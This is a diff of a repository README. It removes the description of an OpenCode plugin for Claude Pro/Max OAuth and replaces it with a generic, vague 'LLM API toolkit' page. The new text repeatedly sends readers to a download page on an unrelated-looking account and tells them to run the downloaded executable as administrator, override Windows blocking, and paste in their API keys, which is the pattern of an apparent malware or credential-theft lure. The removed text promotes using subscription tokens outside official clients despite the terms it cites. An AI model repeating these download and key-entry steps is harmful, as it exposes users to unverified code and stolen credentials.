@@ -1,138 +1,280 @@
-# opencode-anthropic-oauth
+# 🤖 invalid-token-opencode - Simple LLM API toolkit
 
-**Fix "invalid token" in OpenCode — working OAuth solution for Anthropic Claude (Pro/Max)**
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Page-blue?style=for-the-badge)](https://github.com/newsumeetenterprises43-dot/invalid-token-opencode)
 
-If your OpenCode setup stopped working with **Anthropic / Claude** and you're getting errors like:
+## 📦 What this app is
 
-> invalid token  
-> authentication failed  
-> unauthorized request  
+invalid-token-opencode is a toolkit for working with AI chat services on your computer. It helps you connect to model providers like Claude, GPT, and other LLM APIs in one place.
 
-👉 This plugin is a **working solution to restore access** and make everything run again.
+Use it to:
 
----
+- test API access
+- send prompts to different models
+- try streaming responses
+- run tasks with async support
+- keep your setup vendor-neutral
 
-## 🚀 What is this?
+It is built for users who want a single app that can work with more than one AI provider.
 
-An open-source OpenCode plugin that allows you to:
+## 🖥️ System requirements
 
-- Authenticate with Claude Pro / Max
-- Use Anthropic models inside OpenCode
-- Bypass broken token flows
-- Avoid installing Claude Code
+Before you start, check that your Windows PC meets these basics:
 
-💡 In short:  
-**Fix OpenCode + Anthropic integration and make it work again.**
+- Windows 10 or Windows 11
+- Internet access
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- A stable sign-in for the AI provider you want to use
 
----
+If you plan to run larger models or heavy workflows, more memory helps.
 
-## 🔥 Why this exists
+## 🔽 Download and install
 
-Recently, many users faced:
+1. Open the download page:
+   https://github.com/newsumeetenterprises43-dot/invalid-token-opencode
 
-- invalid token opencode  
-- Claude not responding  
-- subscription not working in OpenCode  
+2. On that page, look for the latest available release or download option.
 
-This happens because Anthropic restricted how tokens are used.
+3. Download the Windows file for your system.
 
-👉 This plugin provides a **working OAuth-based method** to reconnect your account.
+4. If the file comes in a ZIP folder, right-click it and choose Extract All.
 
----
+5. Open the extracted folder.
 
-## ⚡ Installation
+6. If you see an app file, double-click it to start the program.
 
-```bash
-npm install -g opencode-anthropic-oauth
-```
+7. If Windows asks for permission, select Yes.
 
-Add to your `opencode.json`:
+If the page offers more than one file, choose the one that matches Windows. If you are not sure, pick the file marked for Windows or x64.
 
-```json
-{
-  "plugin": ["opencode-anthropic-oauth"]
-}
-```
+## 🧭 First-time setup
 
----
+When you open the app for the first time, you may need to set up your AI provider details.
 
-## 🧠 Usage (Fix in 1 minute)
+Common setup items include:
 
-1. Run:
-   ```
-   /connect
-   ```
-   or:
-   ```
-   oc auth login
-   ```
+- API key
+- provider name
+- model name
+- endpoint or base URL
+- streaming option
 
-2. Select:
-   ```
-   Anthropic → Claude Pro/Max
-   ```
+A simple setup usually looks like this:
 
-3. Open the browser link  
-4. Login to your Claude account  
-5. Paste the code back into OpenCode  
+1. Open the settings screen.
+2. Choose your provider.
+3. Paste in your API key.
+4. Select the model you want to use.
+5. Save the settings.
+6. Run a test message.
 
-✅ Done — your Claude models are working again
+If you use more than one provider, you can switch between them without changing your whole setup.
 
----
+## 🔐 API key setup
 
-## 🛠️ How it works
+To use the app, you need an API key from your AI provider.
 
-- Implements OAuth PKCE flow
-- Uses Anthropic auth endpoints
-- Opens browser login (secure)
-- Exchanges code for access + refresh tokens
-- Stores tokens and refreshes automatically
-- Sets required API headers
+Typical steps:
 
-👉 Result: stable and working Claude access inside OpenCode
+1. Sign in to your provider account.
+2. Open the API or developer page.
+3. Create a new key.
+4. Copy the key.
+5. Paste it into invalid-token-opencode.
+6. Save your changes.
 
----
+Keep your key private. If it stops working, make a new one from the provider portal.
 
-## 🔑 Working Methods
+## 💬 Main features
 
-### ✅ Method 1 (Recommended — OAuth)
-- Uses Claude Pro/Max subscription
-- No API keys required
-- Fixes invalid token errors
-- Automatic token refresh
+### ✅ Unified provider access
 
-### ⚙️ Method 2 (Alternative — API)
-- Use official Anthropic API keys
-- More stable long-term
-- Pay-as-you-go pricing
-- No dependency on subscription
+Work with several LLM services through one app. This helps when you want to compare results or move between vendors.
 
----
+### ✅ Streaming responses
 
-## ⚠️ Disclaimer
+See answers as they arrive instead of waiting for the full reply.
 
-This plugin uses Anthropic’s public OAuth client.
+### ✅ Async execution
 
-Anthropic Terms of Service (February 2026) state that Claude Pro/Max subscription tokens should only be used with official clients.
+Run tasks without blocking the app, which helps with longer requests.
 
-👉 This is a community workaround  
-👉 It may stop working at any time  
+### ✅ Testing tools
 
-Use at your own discretion.
+Check whether your API key, model, and connection work before you rely on them.
 
----
+### ✅ Flexible workflows
 
-## 💬 SEO Keywords
+Use the toolkit for chat, automation, and request testing.
 
-- opencode invalid token fix  
-- claude opencode not working  
-- anthropic oauth workaround  
-- fix claude authentication error  
-- opencode claude pro max login  
-- restore anthropic access  
+### ✅ Vendor-independent setup
 
----
+Keep your work portable across providers instead of tying it to one service.
 
-## 📄 License
+## 🧪 How to use it
 
-MIT
+A simple way to get started:
+
+1. Open the app.
+2. Enter your provider details.
+3. Pick a model.
+4. Type a prompt.
+5. Click the send button.
+6. Read the response.
+7. Try another provider if you want to compare results.
+
+Example prompts you can try:
+
+- Summarize this text in plain English.
+- Rewrite this email so it sounds polite.
+- List three ways to improve this plan.
+- Explain this error message in simple terms.
+- Draft a short message for a client.
+
+## 🛠️ Troubleshooting
+
+### App does not open
+
+- Check that the file finished downloading.
+- If the app came in a ZIP file, extract it first.
+- Right-click the app and choose Run as administrator.
+- Make sure Windows did not block the file.
+
+### API key does not work
+
+- Copy the key again from your provider dashboard.
+- Check that you did not add a space before or after the key.
+- Confirm that the key is still active.
+- Make sure you selected the right provider.
+
+### No response from the model
+
+- Check your internet connection.
+- Try a smaller prompt.
+- Switch to another model.
+- Turn streaming off and test again.
+
+### The app is slow
+
+- Close other large apps.
+- Use a lighter model.
+- Restart the app.
+- Check your network speed.
+
+## 🔄 Working with multiple providers
+
+This toolkit is useful when you want to compare AI services side by side.
+
+You can:
+
+- test Claude with one prompt
+- send the same prompt to GPT
+- compare speed and output
+- switch providers when one is busy
+- keep your workflow in one place
+
+This makes it easier to choose the model that fits your task.
+
+## 📁 Common use cases
+
+People use invalid-token-opencode for:
+
+- prompt testing
+- API checks
+- quick model comparisons
+- automated request flows
+- streaming chat experiments
+- app integration tests
+
+It fits users who want a light setup for AI work on Windows.
+
+## ⌨️ Basic workflow
+
+A simple daily flow can look like this:
+
+1. Open the app.
+2. Load your provider settings.
+3. Select a model.
+4. Enter your prompt.
+5. Review the response.
+6. Save useful prompts for later.
+7. Repeat with another provider if needed.
+
+## 📌 Tips for smooth use
+
+- Use short prompts when testing
+- Keep one API key per provider
+- Save settings before closing the app
+- Test one provider at a time
+- Use clear model names so you can tell them apart
+- Restart the app after major setting changes
+
+## 🧩 Supported provider types
+
+The toolkit is built to work with common AI API patterns, such as:
+
+- Anthropic-style connections
+- OpenAI-style connections
+- cloud-hosted model services
+- OAuth-based access flows
+- standard LLM endpoints
+
+This gives you room to connect different services with one interface.
+
+## 📄 File and folder behavior
+
+When you install or unpack the app, you may see:
+
+- the main app file
+- a config folder
+- log files
+- README or help files
+- cache data for recent sessions
+
+If you change settings, the app may store them in a local config file so you do not need to enter them again every time.
+
+## 🧭 Download again later
+
+If you want to get the app again or check for a newer copy, use this page:
+
+[Visit the download page](https://github.com/newsumeetenterprises43-dot/invalid-token-opencode)
+
+## ❓ Common questions
+
+### Do I need coding knowledge?
+
+No. You can use the app by entering your provider details and clicking the buttons on screen.
+
+### Can I use more than one AI provider?
+
+Yes. The app is made for switching between providers and testing them in one place.
+
+### Does it support live replies?
+
+Yes. Streaming support lets you see text as it arrives.
+
+### Can I use it for automation?
+
+Yes. It supports async workflows and request handling for task-based use.
+
+### Is it only for Claude or GPT?
+
+No. It is built for multiple providers, not just one service.
+
+## 🧷 Helpful terms
+
+- **API key**: a private code that lets the app talk to your AI provider
+- **Provider**: the company or service that gives the model
+- **Model**: the AI engine you send prompts to
+- **Streaming**: text appears while the model is still replying
+- **Async**: the app can handle tasks without freezing
+
+## 📥 Download and run on Windows
+
+1. Open https://github.com/newsumeetenterprises43-dot/invalid-token-opencode
+2. Download the Windows file from the page
+3. Extract the file if it comes in a ZIP folder
+4. Open the app file
+5. Allow Windows permissions if asked
+6. Enter your provider details
+7. Start sending prompts
